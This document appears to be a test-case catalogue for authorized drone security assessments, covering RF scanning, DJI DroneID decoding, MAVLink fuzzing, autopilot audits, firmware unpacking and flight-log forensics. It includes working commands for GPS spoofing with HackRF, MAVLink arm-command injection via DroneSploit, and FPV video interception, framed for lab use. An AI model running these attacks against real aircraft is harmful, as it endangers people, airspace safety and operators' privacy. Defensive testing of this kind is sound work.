# UAV / Drone Security Test Cases

> Companion to `SKILL.md` — structured test cases for authorized UAV/drone security assessments.
> All active RF tests (transmit, spoof, jam, replay) require a Faraday cage, shielded range, or FCC experimental authorization. 18 U.S.C. § 32 makes interfering with any aircraft you do not own a federal felony in the USA.

---

## Statistics

| Category | Count | Severity Range |
|----------|-------|----------------|
| A. RF Recon & DroneID | 2 | LOW - MEDIUM |
| B. MAVLink Protocol | 2 | MEDIUM - HIGH |
| C. Autopilot Stacks (PX4/ArduPilot) | 2 | MEDIUM - HIGH |
| D. GPS Spoofing & Control Link | 2 | HIGH - CRITICAL |
| E. Video Link & DroneSploit | 2 | MEDIUM - HIGH |
| F. Firmware & Forensics | 2 | MEDIUM - HIGH |
| **Total** | **12** | **LOW - CRITICAL** |

---

## A. RF Recon & DroneID

### TC-UD-001: RF Spectrum Scan for Drone Signals

| Field | Value |
|------|-----|
| **ID** | TC-UD-001 |
| **Title** | RF Spectrum Survey of 2.4 GHz / 5.8 GHz / 900 MHz Drone Bands |
| **Objective** | Conduct an authorized RF spectrum survey to identify active drone transmissions in 2.4 GHz (control link), 5.8 GHz (video link), and 900 MHz (telemetry) bands, and characterize each signal's modulation, bandwidth, and duty cycle. |
| **Steps** | 1. Verify SDR hardware with `hackrf_info` and `rtl_test -t`; confirm HackRF One serial and firmware version.<br>2. Sweep 2.4 GHz ISM band: `hackrf_sweep -f 2400:2500 -l 32 -g 30 -w 1000000 -1 > sweep_2400.csv`.<br>3. Sweep 5.8 GHz FPV band (HackRF only, RTL-SDR v3 cannot reach this): `hackrf_sweep -f 5725:5875 -l 32 -g 30 -w 1000000 -1 > sweep_5800.csv`.<br>4. Sweep 900 MHz telemetry band (USA/AU): `rtl_power -f 902M:928M:100k -i 1 -e 60 band_900.csv`.<br>5. Visualize each scan with `python3 -m urh.heatmap sweep_*.csv`; identify bursts above the noise floor (typically > -50 dB).<br>6. Document each detected signal: frequency, bandwidth, modulation (visual inspection), duty cycle, and likely source (drone type). |
| **Expected Result** | Per-band heatmap with at least 1 active drone signal identified and characterized. For a known test drone (e.g. DJI Mavic Mini), expect FHSS bursts across 2.4 GHz (80 channels, ~2 MHz each) and a continuous 5.8 GHz video carrier. |
| **Tools** | HackRF One (or RTL-SDR v3 for sub-1.7 GHz only), GQRX, Universal Radio Hacker, inspectrum, Python (numpy, urh) |
| **MITRE** | TA0007-Discovery (T1046 — network service discovery analog for RF spectrum survey) |
| **Difficulty** | 2 - Easy |
| **Tags** | rf, spectrum, survey, fhss, 2.4ghz, 5.8ghz, hackrf, rtl-sdr |

### TC-UD-002: DJI DroneID Decode

| Field | Value |
|------|-----|
| **ID** | TC-UD-002 |
| **Title** | Decode DJI DroneID Broadcast over the Air |
| **Objective** | Capture and decode the DJI DroneID broadcast (which leaks serial number, aircraft position, and operator location) from an authorized DJI test aircraft using HackRF + the open DroneID wireshark dissector. |
| **Steps** | 1. Install DroneID tools: `git clone https://github.com/trendmicro/DroneID-timeline.git` and copy `droneid.lua` to `~/.local/share/wireshark/plugins/`.<br>2. Capture 2.4 GHz wideband with HackRF for ≥10 seconds while a DJI drone is powered on and within 100 m: `hackrf_transfer -r droneid_2440.raw -f 2440000000 -s 20000000 -l 32 -g 30 -n 200000000`.<br>3. Demodulate the capture with GNURadio (DroneID gr-blocks); produce `droneid_decoded.pcap`.<br>4. Inspect with tshark: `tshark -r droneid_decoded.pcap -Y "droneid" -T fields -e droneid.serial_number -e droneid.drone_lat -e droneid.drone_lon -e droneid.home_lat -e droneid.home_lon`.<br>5. Cross-reference the decoded serial number with the aircraft's physical serial (on the airframe); verify aircraft and home (operator) positions match expected locations. |
| **Expected Result** | At least 1 complete DroneID message decoded with valid serial number (10-char alphanumeric matching the airframe label), aircraft lat/lon within 10 m of the actual position, and home lat/lon matching the operator location. |
| **Tools** | HackRF One, GNURadio (with DroneID gr-blocks), Wireshark + droneid.lua dissector, tshark |
| **MITRE** | TA0007-Discovery (T1046), TA0040-Detection (blue-side DroneID listener deployment) |
| **Difficulty** | 3 - Medium |
| **Tags** | droneid, dji, wireshark-dissector, serial-number, operator-location, blue-side, privacy |

---

## B. MAVLink Protocol

### TC-UD-003: MAVLink Capture with MAVProxy

| Field | Value |
|------|-----|
| **ID** | TC-UD-003 |
| **Title** | Capture and Decode MAVLink Traffic with MAVProxy and tshark |
| **Objective** | Attach to an authorized MAVLink source (PX4/ArduPilot SITL or telemetry radio), log all MAVLink traffic, decode packet types and heartbeat parameters, and identify the autopilot vendor/version. |
| **Steps** | 1. Stand up PX4 SITL: `cd PX4-Autopilot && make px4_sitl jmavsim` (SITL listens on TCP 4560).<br>2. Attach MAVProxy: `mavproxy.py --master=tcp:127.0.0.1:4560 --console --map --logfile=/tmp/mavlink.log`.<br>3. Simultaneously capture with tshark: `tshark -i any -f "udp portrange 14550-14551 or tcp portrange 5760-5762" -w mavlink_capture.pcap`.<br>4. Identify MAVLink version (1 vs 2): `tshark -r mavlink_capture.pcap -Y mavlink -T fields -e mavlink.stx | sort | uniq -c` (0xFE = v1, 0xFD = v2).<br>5. Decode heartbeat to identify autopilot: `tshark -r mavlink_capture.pcap -Y "mavlink.msgid == 0" -T fields -e mavlink.heartbeat.type -e mavlink.heartbeat.autopilot -e mavlink.heartbeat.mavlink_version` (type=2 quad, autopilot=12 PX4, autopilot=3 ArduPilot).<br>6. Catalog message frequency distribution: `tshark -r mavlink_capture.pcap -Y mavlink -T fields -e mavlink.msgname | sort | uniq -c | sort -rn | head -20`. |
| **Expected Result** | Complete 5-minute MAVLink capture with heartbeat showing correct type/autopilot/version for the test vehicle. Message distribution shows HEARTBEAT at 1 Hz, ATTITUDE at 10+ Hz, GLOBAL_POSITION_INT at 5 Hz, and other expected messages. |
| **Tools** | PX4-Autopilot (SITL), mavproxy.py, pymavlink, tshark, Wireshark with MAVLink dissector |
| **MITRE** | TA0007-Discovery (T1046 — network service discovery), TA0009-Collection (T1040 — network traffic capture) |
| **Difficulty** | 2 - Easy |
| **Tags** | mavlink, mavproxy, tshark, sitl, px4, heartbeat, version-detection |

### TC-UD-004: MAVLink Message Fuzzing

| Field | Value |
|------|-----|
| **ID** | TC-UD-004 |
| **Title** | MAVLink Message Fuzzing Against an Authorized Autopilot |
| **Objective** | Use a custom MAVLink fuzzer (pymavlink + boofuzz) to send malformed packets to an authorized SITL autopilot and identify which message types crash the autopilot, hang it, or cause unexpected behavior. |
| **Steps** | 1. Stand up PX4 SITL with crash detection enabled: `cd PX4-Autopilot && make px4_sitl default_px4fmu-v5` (note: SITL crash dumps core dumps to `/tmp`).<br>2. Configure a MAVLink fuzzer using pymavlink that sends: (a) every type/autopilot heartbeat combo, (b) COMMAND_LONG with every cmd id (0-600) and random params, (c) SET_MODE with invalid mode values, (d) PARAM_VALUE with oversized param_id (15-128 chars).<br>3. Run the fuzzer against SITL: `python3 mavlink_fuzzer.py --connect udp:127.0.0.1:14550 --duration 600`.<br>4. Monitor SITL for crashes: tail the SITL log, watch for the autopilot disappearing from the heartbeat stream, or run SITL under gdb/valgrind.<br>5. For each crash/hang, capture the SITL stack trace and the specific message that triggered it.<br>6. Document every finding with: msg type, params, SITL response, and reproduction steps. |
| **Expected Result** | SITL handles all malformed messages gracefully OR specific messages identified that crash/hang the autopilot (HIGH severity findings). Typical findings: oversized param_id may trigger buffer overflow warnings; SET_MODE to invalid custom_mode may silently fail; COMMAND_LONG to unknown cmd id returns COMMAND_ACK with RESULT_UNSUPPORTED. |
| **Tools** | PX4-Autopilot (SITL), pymavlink, boofuzz, gdb or valgrind, tshark |
| **MITRE** | TA0040-Detection (T1518 — fuzzing to discover weak handling), TA0008-Execution (T1059 — automated script execution) |
| **Difficulty** | 4 - Hard |
| **Tags** | mavlink, fuzzing, pymavlink, boofuzz, crash-detection, sitl, param-id |

---

## C. Autopilot Stacks (PX4/ArduPilot)

### TC-UD-005: PX4 Parameter Dump and Audit

| Field | Value |
|------|-----|
| **ID** | TC-UD-005 |
| **Title** | PX4 Parameter Dump and Dangerous-Parameter Audit |
| **Objective** | Dump the complete PX4 parameter set, identify all parameters affecting safety, arming, failsafes, and geofencing, and flag any configuration that weakens the drone's safety posture. |
| **Steps** | 1. Stand up PX4 SITL: `cd PX4-Autopilot && make px4_sitl jmavsim`.<br>2. Attach MAVProxy: `mavproxy.py --master=tcp:127.0.0.1:4560`.<br>3. Inside MAVProxy console, dump all parameters: `param save /tmp/px4_params.txt`.<br>4. Audit dangerous parameter groups: `param show COM_*`, `param show NAV_*`, `param show RTL_*`, `param show MAV_*`.<br>5. Check specific high-risk parameters and document their values: `COM_RC_OVERRIDE` (should be 1), `NAV_RCL_ACT` (should be ≥ 1 for failsafe), `NAV_DLL_ACT`, `RTL_RETURN_ALT` (should be ≥ 30 m for obstacle clearance), `COM_OBS_AVOID_TILT`, `COM_ARM_CHK_ESCS` (should be enabled).<br>6. Look for any parameter that has been modified from factory default by comparing against the PX4 default parameter list (documented at docs.px4.io). |
| **Expected Result** | Complete parameter dump of 1000+ PX4 parameters with all safety-relevant parameters (COM_ARM_*, NAV_*, RTL_*, FS_*) documented. Any disabled failsafe, disabled arming check, or unusual geofencing config is flagged as HIGH severity. |
| **Tools** | PX4-Autopilot (SITL), MAVProxy, pymavlink |
| **MITRE** | TA0007-Discovery (T1082 — system information discovery analog for param enumeration), TA0040-Detection (T1518 — tool/parameter discovery) |
| **Difficulty** | 3 - Medium |
| **Tags** | px4, params, failsafe, arming-check, audit, mavproxy |

### TC-UD-006: ArduPilot GCS Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-UD-006 |
| **Title** | ArduPilot Ground Control Station Enumeration and Mode Mapping |
| **Objective** | Stand up ArduPilot SITL, enumerate autopilot capabilities via MAVLink, identify the GCS protocol extensions (custom ArduPilot messages), and map custom_mode values to flight modes. |
| **Steps** | 1. Stand up ArduPilot SITL: `cd ardupilot && Tools/autotest/sim_vehicle.py -v ArduCopter -f quad --map --console --out=udp:127.0.0.1:14550`.<br>2. Attach MAVProxy to the SITL: `mavproxy.py --master=tcp:127.0.0.1:5760 --console --map`.<br>3. Request AUTOPILOT_VERSION message: `python3 -c "from pymavlink import mavutil; m = mavutil.mavlink_connection('udp:127.0.0.1:14550'); m.wait_heartbeat(); m.mav.autopilot_version_request_send(m.target_system, m.target_component); print(m.recv_match(type='AUTOPILOT_VERSION', blocking=True, timeout=5))"`.<br>4. Dump all parameters to file: `param dump /tmp/ap_params.parm` inside MAVProxy.<br>5. Catalog ArduPilot custom messages (msgid 115, 174, 180, 200, 224, 243, 253): `tshark -i any -f "udp port 14550" -Y mavlink -T fields -e mavlink.msgid | sort -n | uniq -c`.<br>6. Test each ArduCopter flight mode via SET_MODE (custom_mode 0-17): for each mode, send SET_MODE and observe HEARTBEAT change. |
| **Expected Result** | ArduPilot AUTOPILOT_VERSION message with correct flight_sw_version. Custom mode enumeration: STABILIZE=0, ACRO=1, ALT_HOLD=2, AUTO=3, GUIDED=4, LOITER=5, RTL=6, CIRCLE=7, LAND=9. All custom ArduPilot messages (115, 174, 180, 200, 224, 253) detected in traffic. |
| **Tools** | ArduPilot SITL (sim_vehicle.py), MAVProxy, pymavlink, tshark |
| **MITRE** | TA0007-Discovery (T1046, T1082), TA0009-Collection (T1602 — config repository discovery) |
| **Difficulty** | 3 - Medium |
| **Tags** | ardupilot, gcs, custom-mode, autopilot-version, mode-mapping |

---

## D. GPS Spoofing & Control Link

### TC-UD-007: GPS Spoofing Lab with HackRF + GPS-SDR-SIM

| Field | Value |
|------|-----|
| **ID** | TC-UD-007 |
| **Title** | GPS Spoofing Lab — Take Over a u-blox Receiver's Position Fix |
| **Objective** | In a Faraday cage, demonstrate that GPS-SDR-SIM + HackRF can spoof a u-blox NEO-M8N receiver's position to an attacker-chosen location, and validate spoof-detection indicators on the receiver. |
| **Steps** | 1. Build GPS-SDR-SIM: `git clone https://github.com/osqzssp/GPS-SDR-SIM.git && cd GPS-SDR-SIM && make`.<br>2. Download a current BRDC ephemeris from NASA CDDIS: `wget https://cddis.nasa.gov/archive/gnss/data/daily/2024/brdc/BRDC00IGS_R_20241550000_01D_MN.rnx.gz && gunzip *.gz`.<br>3. Generate a spoof trajectory at a chosen location: `./gpssim -e brdc3550.24n -l 30.28650,120.03240,100 -b 8 -d 300 -o spoof_static.bin`.<br>4. Place the HackRF + reference u-blox receiver inside a Faraday cage; connect u-blox via USB to a monitoring host.<br>5. Begin monitoring the u-blox NMEA stream: `python3 monitor_receiver.py /dev/ttyACM0` (logs lat/lon, sats, C/N0, AGC).<br>6. Transmit the spoof via HackRF inside the cage: `hackrf_transfer -t spoof_static.bin -f 1575420000 -s 2600000 -a 0 -x 10 -R`. Increase `-x` gain until the receiver locks to the spoofed coordinates.<br>7. Document: time to lock, final reported position vs chosen position, C/N0 distribution (should be high and uniform — a spoof indicator), AGC value (pegged high — a spoof indicator). |
| **Expected Result** | The u-blox receiver reports the spoofed coordinates (30.28650°N, 120.03240°E, 100 m) within 60 seconds of HackRF transmission starting. C/N0 for all spoofed satellites is uniform (>40 dB-Hz) vs natural variation (35-50 dB-Hz). AGC value is pegged at maximum. |
| **Tools** | HackRF One, GPS-SDR-SIM, u-blox NEO-M8N reference receiver, Faraday cage, NASA CDDIS BRDC ephemeris |
| **MITRE** | T1557-Adversary-in-the-Middle (GPS spoofing), TA0040-Detection (receiver-side spoof indicators) |
| **Difficulty** | 5 - Expert |
| **Tags** | gps-spoofing, hackrf, gpssim, faraday-cage, ublox, cn0-indicator, agc-pegged, critical |

### TC-UD-008: 2.4 GHz FHSS Pattern Recovery

| Field | Value |
|------|-----|
| **ID** | TC-UD-008 |
| **Title** | 2.4 GHz FHSS Pattern Recovery with HackRF |
| **Objective** | Capture a full hopping sequence of a 2.4 GHz FHSS control link (FrSky/FlySky/ELRS) over 60 seconds, recover the hop channels and timing, and identify the pseudo-random sequence seed (sync word in the bind packet). |
| **Steps** | 1. Verify HackRF One with `hackrf_info`; confirm firmware version.<br>2. Power on an authorized test transmitter (e.g. FrSky Taranis X-Lite with X4R-SB receiver) in a shielded range.<br>3. Capture the full 2.4 GHz band at 20 MSPS for 60 seconds: `hackrf_transfer -r control_2400.raw -f 2440000000 -s 20000000 -l 32 -g 30 -n 1200000000`.<br>4. Process in Python with STFT analysis to extract hop timestamps and frequencies: see payloads.md Section 11 for the analysis script.<br>5. Plot hop pattern: time on x-axis, frequency on y-axis, power as color; the hopping pattern should be visible as a sawtooth / staggered pattern.<br>6. Identify the hop set (e.g. FrSky D16 uses 47 of the 80 channels), hop rate (typically 150-200 Hz for ELRS, ~50 Hz for FrSky D16), and any sync word markers. |
| **Expected Result** | Hop pattern extracted with at least 30 distinct frequency bins used; hop rate matches expected (~50 Hz for FrSky D16, ~150 Hz for ELRS); visual plot of hop pattern attached to engagement report. Note: full sync word recovery typically requires multiple bind events and is beyond this test case scope. |
| **Tools** | HackRF One, Python (numpy, scipy, matplotlib), inspectrum, authorized test transmitter |
| **MITRE** | TA0007-Discovery (T1040 — network traffic capture analog for RF), TA0006-Credential Access (sync word recovery analog) |
| **Difficulty** | 4 - Hard |
| **Tags** | fhss, 2.4ghz, frsky, elrs, hackrf, stft, sync-word, faraday-cage |

---

## E. Video Link & DroneSploit

### TC-UD-009: 5.8 GHz Analog FPV Video Interception

| Field | Value |
|------|-----|
| **ID** | TC-UD-009 |
| **Title** | 5.8 GHz Analog FPV Video Link Interception and Demodulation |
| **Objective** | Capture an authorized analog FPV video transmission at 5.8 GHz, demodulate the FM video signal to NTSC frames, and assemble the frames into a viewable video file. |
| **Steps** | 1. Verify HackRF One can reach 5.8 GHz (RTL-SDR cannot).<br>2. Sweep 5.8 GHz band for the active channel: `hackrf_sweep -f 5725:5875 -l 32 -g 30 -w 1000000 -1 > sweep_5800.csv`.<br>3. Identify the active channel (strongest signal > -50 dB); FPV channels are 5.725-5.875 GHz (CH1-CH8) at 20 MHz spacing.<br>4. Capture the active channel at 20 MSPS for 10 seconds: `hackrf_transfer -r fpv_ch5.raw -f 5820000000 -s 20000000 -l 32 -g 30 -n 200000000`.<br>5. Open in inspectrum to confirm FM video modulation (visible as continuous carrier with sidebands).<br>6. Demodulate with a GNURadio flowgraph (Osmocom Source → Quadrature Demod → Low Pass Filter → Rational Resampler → Float to UChar → File Sink); save the demodulated signal as `fpv_video.raw`.<br>7. Assemble raw frames into video with ffmpeg: `ffmpeg -f rawvideo -pixel_format gray -video_size 720x480 -r 30 -i fpv_video.raw fpv_output.mp4`. |
| **Expected Result** | A viewable MP4 video file showing the FPV camera feed with at least 5 seconds of recognizable content (e.g. test card, scene). |
| **Tools** | HackRF One, inspectrum, GNURadio Companion, ffmpeg, Python |
| **MITRE** | TA0006-Credential Access (T1040 — capture analog video feed), TA0009-Collection (T1119 — automated collection) |
| **Difficulty** | 4 - Hard |
| **Tags** | 5.8ghz, fpv, analog-video, ntsc, gnuradio, demodulation, ffmpeg |

### TC-UD-010: DroneSploit Module Execution

| Field | Value |
|------|-----|
| **ID** | TC-UD-010 |
| **Title** | DroneSploit Auxiliary Scanner Run Against Authorized MAVLink Host |
| **Objective** | Install DroneSploit framework, run the heartbeat_scanner auxiliary module against an authorized MAVLink host (SITL or hardware), and identify the autopilot's sysid/compid/version. |
| **Steps** | 1. Stand up PX4 or ArduPilot SITL on the target host.<br>2. Install DroneSploit: `git clone https://github.com/dronesploit/dronesploit.git && cd dronesploit && pip3 install -r requirements.txt && python3 dronesploit.py`.<br>3. Inside DroneSploit prompt, load and configure the heartbeat scanner: `use auxiliary/scanner/mavlink/heartbeat_scanner`.<br>4. Set the target: `set RHOSTS 127.0.0.1` and `set RPORT 14550`.<br>5. Run the scan: `run`.<br>6. Observe the discovered heartbeat: sysid, compid, type, autopilot vendor, MAVLink version, custom_mode (flight mode).<br>7. Pivot to command_injection module if authorized: `use exploit/multi/mavlink/command_long_injection`, set COMMAND 400 (arm), set PARAM1 1, exploit. Document the COMMAND_ACK response. |
| **Expected Result** | Heartbeat scanner identifies the SITL autopilot with correct sysid=1, compid=1, autopilot vendor (PX4=12, ArduPilot=3), and MAVLink version. Command injection returns COMMAND_ACK with RESULT_ACCEPTED (if SITL is unauthenticated, which it is by default). |
| **Tools** | DroneSploit framework, PX4 or ArduPilot SITL, MAVProxy (for cross-validation) |
| **MITRE** | TA0007-Discovery (T1046), TA0008-Execution (T1059 — scripting through framework), T1557-Adversary-in-the-Middle (MAVLink injection) |
| **Difficulty** | 3 - Medium |
| **Tags** | dronesploit, mavlink, heartbeat-scanner, command-injection, sitl |

---

## F. Firmware & Forensics

### TC-UD-011: DJI Firmware Extraction

| Field | Value |
|------|-----|
| **ID** | TC-UD-011 |
| **Title** | DJI Firmware Unpacking and Module Inventory |
| **Objective** | Use the community dji-firmware-tools to unpack an authorized DJI firmware image (e.g. Phantom 4 Pro), enumerate the embedded modules (AUAV Linux image, STM32 NuttX firmware, boot images), and document findings including any hardcoded credentials or debug backdoors. |
| **Steps** | 1. Install dji-firmware-tools: `git clone https://github.com/o-gs/dji-firmware-tools.git && cd dji-firmware-tools`.<br>2. Obtain an authorized firmware image (download directly from dji.com; never from third-party sources — risk of trojanized firmware).<br>3. Unpack the firmware: `python3 dji_fwcon.py -vv -u dji_system.bin`. This extracts modules to `modx_*.bin`.<br>4. Identify each module: `file modx_*.bin`. Typical modules: AUAV (Android boot.img), STM32 (ELF), bootloader (raw), config (text).<br>5. Unpack the AUAV Android boot image with `abootimg -x modx_0003.img` (or binwalk for newer formats); mount the root filesystem read-only.<br>6. Triage the root filesystem: look for `/etc/passwd` (hardcoded root password), `/etc/init.d/` (debug services like telnet/adb), `/usr/bin/dji_*` binaries.<br>7. Extract STM32 ELF modules and analyze with Ghidra/binutils: look for backdoor MAVLink sysid (255), debug command handlers, hardcoded keys. |
| **Expected Result** | Firmware unpacked with at least 5 modules extracted and identified. AUAV root filesystem mounted and inspected. Document any findings: hardcoded root password (CVE-2017-16333 in older Phantom 3 firmware), debug telnet port, backdoor MAVLink sysid, or hardcoded encryption keys. All findings documented with severity and recommended remediation. |
| **Tools** | dji-firmware-tools (community), binwalk, abootimg, Ghidra, arm-none-eabi-binutils |
| **MITRE** | TA0005-Defense Evasion (T1601 — modify system image), TA0006-Credential Access (T1552 — unencrypted credentials in firmware) |
| **Difficulty** | 4 - Hard |
| **Tags** | dji, firmware, extraction, dji-fwcon, auav, android, stm32, ghidra |

### TC-UD-012: Flight Log Analysis (.ulg / .bin)

| Field | Value |
|------|-----|
| **ID** | TC-UD-012 |
| **Title** | Flight Log Forensic Analysis — Reconstruct Flight Path and Identify Anomalies |
| **Objective** | Analyze a recovered PX4 `.ulg` or ArduPilot `.bin` flight log, reconstruct the complete flight path, identify any mode changes or arming events, and document any anomalies that could indicate a takeover or unauthorized command. |
| **Steps** | 1. Obtain an authorized flight log file (`.ulg` for PX4, `.bin` for ArduPilot) from a SITL session or a recovered drone.<br>2. For PX4: install pyulog (`pip3 install pyulog`); inspect the log structure: `python3 -m pyulog.info log.ulg`.<br>3. List all logged topics: `python3 -m pyulog.list log.ulg | head -40`.<br>4. Extract position data: parse `vehicle_local_position` and `vehicle_global_position` topics to reconstruct lat/lon/alt over time.<br>5. For ArduPilot: use DFReader from pymavlink to parse `.bin`; extract MODE messages for mode changes, CMD messages for commands, EV messages for events.<br>6. Identify anomalies: (a) sudden mode change to AUTO/GUIDED without pilot action, (b) SET_MODE command from an unexpected sysid, (c) parameter writes outside the engagement window, (d) GPS position jumps (potential spoofing).<br>7. Produce a forensic timeline: arming time, takeoff, mode changes, RTL trigger, landing; cross-reference with operator's stated intent. |
| **Expected Result** | Complete flight path reconstruction (lat/lon/alt vs time) matching the operator's stated flight. Anomaly list: if any mode change without operator input, parameter write without authorization, or GPS jump > 100 m/s — these are HIGH severity and may indicate takeover. |
| **Tools** | pyulog (PX4), pymavlink DFReader (ArduPilot), DatCon (DJI), python (numpy, matplotlib) |
| **MITRE** | TA0009-Collection (T1078 — valid accounts analog for valid sysid), TA0040-Detection (forensic anomaly detection) |
| **Difficulty** | 3 - Medium |
| **Tags** | forensics, ulog, bin, px4, ardupilot, flight-log, anomaly-detection, mode-change |

---

## Verification Checklist

- [ ] All SDR hardware (HackRF, RTL-SDR) properly detected and calibrated
- [ ] Spectrum scan covers 2.4 GHz, 5.8 GHz, and 900 MHz drone bands
- [ ] DroneID decode produces valid serial + position for at least one test drone
- [ ] MAVLink capture contains both v1 and v2 packets (or documents version used)
- [ ] MAVLink fuzzer identifies any crash/hang findings with reproduction steps
- [ ] PX4 / ArduPilot parameter dumps complete with all safety params audited
- [ ] GPS spoofing lab produces spoofed coordinates on reference receiver (Faraday cage only)
- [ ] FHSS capture produces hop pattern plot for at least one transmitter
- [ ] 5.8 GHz video interception produces viewable video output
- [ ] DroneSploit run identifies target autopilot and tests command injection
- [ ] DJI firmware extraction produces ≥5 modules with documented findings
- [ ] Flight log analysis produces complete timeline with anomaly list
- [ ] All active RF tests documented with Faraday cage usage and FAA Part 107 compliance
- [ ] All findings reported with severity per the engagement rubric
- [ ] No active interdiction attempted of any aircraft not explicitly owned and authorized
